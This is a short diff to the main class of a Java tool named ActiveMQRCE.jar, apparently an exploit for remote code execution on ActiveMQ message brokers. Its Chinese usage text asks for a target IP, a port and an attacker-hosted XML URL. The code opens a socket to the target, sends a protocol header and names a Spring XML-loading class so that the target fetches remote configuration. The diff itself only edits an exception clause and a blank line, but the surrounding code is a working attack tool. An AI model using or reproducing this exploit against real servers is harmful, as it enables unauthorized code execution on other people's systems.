@@ -33,7 +33,7 @@ public class Main {
         return sb.toString();
     }
 
-    public static void main(String[] args) throws JMSException, IOException {
+    public static void main(String[] args) throws  IOException {
         if (args.length < 3) {
             System.out.println("[!] 请输入目标ip，端口，以及你的xml的url地址");
             System.out.println("[*] java -jar ActiveMQRCE.jar 127.0.0.1 61616 http://127.0.0.1:13443/test.xml ");
@@ -41,7 +41,6 @@ public class Main {
         }
         Socket socket = new Socket(args[0], Integer.parseInt(args[1]));
         OutputStream outputStream = socket.getOutputStream();
-
         byte[] header = new byte[]{0x1f,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00};
 
         String className = "org.springframework.context.support.FileSystemXmlApplicationContext";
